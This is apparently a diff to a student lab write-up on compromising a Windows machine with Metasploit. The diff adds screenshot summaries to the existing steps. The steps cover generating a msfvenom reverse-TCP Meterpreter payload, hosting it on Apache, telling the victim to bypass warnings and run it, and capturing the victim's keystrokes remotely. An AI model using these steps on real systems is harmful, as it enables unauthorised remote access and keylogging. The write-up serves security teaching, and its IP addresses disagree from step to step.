@@ -27,26 +27,58 @@ Find the attackers ip address using ifconfig
 
 <img width="778" height="419" alt="1 11" src="https://github.com/user-attachments/assets/f6011f4f-e20e-4ffb-a6e5-6ebba1601545" />
 
+## Summary:
+
+The image shows the use of the ifconfig command in Kali Linux to display the network configuration details of the system. It provides information about the active network interfaces, including the IP address, MAC address, transmitted packets, received packets, and loopback interface details. This step is mainly used to identify the attacker machine’s IP address before performing network-related tasks.
+
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 #### OUTPUT
 <img width="1139" height="218" alt="2 2" src="https://github.com/user-attachments/assets/29d2d803-0bac-4c16-9da2-04dc8bd9f193" />
 
+## Summary:
+
+The image demonstrates the creation of a malicious executable payload using the msfvenom tool in Kali Linux. A Windows Meterpreter reverse TCP payload is generated with a specified local host IP address and port number, and the output file is saved as fun.exe. This payload is intended to establish a reverse connection from the target system to the attacker machine.
+
+
 copy the fun.exe into the apache /var/www/html folder
 
 <img width="427" height="60" alt="2 1" src="https://github.com/user-attachments/assets/cd1d95ad-8ae2-4ad8-a734-904bfde68808" />
+
+## Summary:
+
+The image shows the command used to copy the generated payload file fun.exe into the Apache web server directory /var/www/html/. This allows the executable file to be hosted on the web server so it can be downloaded from another system through a web browser or direct link.
+
 
 Start apache server
 sudo systemctl apache2 start
 
 <img width="370" height="49" alt="2 2" src="https://github.com/user-attachments/assets/b2568659-97a7-4c8e-8bdf-958604d18206" />
 
+## Summary:
+
+The image illustrates the restarting of the Apache HTTP server using the systemctl restart apache2 command. Restarting the service ensures that the web server is active and updated with the newly added payload file in the hosting directory.
+
+
 Check the status of apache2
 
 ![status](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d5dca89e-d102-408d-aa25-d60e7e09ff2b)
 
+## Summary:
+
+The image displays the status of the Apache web server using the systemctl status apache2 command. The output confirms that the Apache HTTP server is running successfully, along with details such as service status, process information, memory usage, and startup logs.
+
+
 Invoke msfconsole:
 ## OUTPUT:
+
+<img width="617" height="456" alt="image" src="https://github.com/user-attachments/assets/0143940b-baec-48a6-9003-42afe8bf7d32" />
+
+## Summary:
+
+This image shows the Metasploit Framework being launched on Kali Linux using the msfconsole command. The console displays the Metasploit banner, framework version information, and statistics about available exploits, payloads, encoders, and auxiliary modules. It indicates that the penetration testing environment has been initialized successfully.
+
+
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
 Starting a command and control Server
@@ -57,6 +89,10 @@ exploit
 
 <img width="626" height="284" alt="3 1" src="https://github.com/user-attachments/assets/96d05af1-f84f-4225-a9ce-d79b2a089e43" />
 
+## Summary:
+
+This image shows the configuration of a Metasploit multi/handler module. The payload is set to windows/meterpreter/reverse_tcp, and the attacker configures the LHOST as 10.50.252.7 and LPORT as 4444. These settings define where the victim machine will connect back after executing the payload. Finally, the exploit command is executed to start the listener.
+
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.50.252.7/fun.exe
@@ -64,16 +100,30 @@ The file "fun.exe" downloads.
 
 <img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/82af2852-1c17-4b9b-b5bd-2d99352c0fd1" />
 
+## Summary:
+
+This image shows the Google Chrome download history on the Windows target machine. A suspicious executable file named fun.exe is visible among downloaded files. This suggests that the payload generated for the Metasploit attack was downloaded onto the victim system and is ready for execution.
+
+
 Bypass any warning boxes, double-click the file, and allow it to run.
 
 On kali give the command exploit
 
 <img width="882" height="76" alt="3 3" src="https://github.com/user-attachments/assets/8810d49a-421a-4aa2-8d71-2a31cd84e138" />
 
+## Summary:
+
+This image confirms that the reverse Meterpreter connection was successful. The Metasploit console shows that a reverse TCP handler started on port 4444, the payload stage was sent to the target machine, and a Meterpreter session was opened successfully. This indicates that remote access to the victim system has been achieved.
+
+
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 
 <img width="1920" height="1200" alt="4" src="https://github.com/user-attachments/assets/81cb1a51-5c70-4bdc-b5f1-4adf2c34cc4d" />
+
+## Summary:
+
+This image displays a list of active processes running on the compromised Windows machine through the Meterpreter session. The attacker can view process IDs, executable names, architectures, users, and file paths. Processes such as Chrome, Microsoft Edge, Windows services, and the payload executable (fun.exe) are visible, demonstrating successful enumeration and remote interaction with the target system.
 
 
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
@@ -89,14 +139,28 @@ Notice the "PID/Program name" value for this connection, which is redacted
 
 <img width="1920" height="1200" alt="g" src="https://github.com/user-attachments/assets/ed3e18c3-fc20-4e90-97e7-ed3fb88af229" />
 
+## Summary:
+
+The image shows a Kali Linux terminal running a Meterpreter session in Metasploit. The attacker migrated the Meterpreter session into the explorer.exe process successfully to maintain a stable connection. After migration, the netstat command was executed to display active network connections and listening ports on the target Windows machine. The output lists multiple TCP connections, process IDs, and associated applications such as svchost.exe, chrome.exe, and msedge.exe, indicating that the attacker is monitoring system activity and network communications on the compromised system.
+
+
 Post Exploitation
 
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 <img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/348a0615-b7e6-47cc-a21d-3fc7d23a741a" />
+
+## Summary:
+
+The image displays a Windows Notepad window open on the victim machine. A text file named he;llo da Vijay..txt contains the typed message “he;llo da Vijay.” This image demonstrates user activity on the compromised system. The browser in the background shows a GitHub page related to Metasploit and Windows compromise techniques, indicating that the activity may be part of a cybersecurity lab or penetration testing demonstration. The typed text is later captured through keylogging in the next image.
+
 keyscan_dump	Shows the keystrokes captured so far
 
 <img width="522" height="161" alt="e" src="https://github.com/user-attachments/assets/b3bba120-7acb-49aa-9f5c-706e2303a729" />
+
+## Summary:
+
+The image shows the Meterpreter console running the commands keyscan_start and keyscan_dump. The keylogger successfully captured keystrokes typed on the victim machine. The dumped output includes the text “note;llo da vijay.” along with keyboard inputs like <^V><CR>, proving that the attacker was able to record user keystrokes remotely. This demonstrates how Meterpreter’s keylogging feature can monitor and capture sensitive user input from a compromised Windows system.
 
 
 ## RESULT:
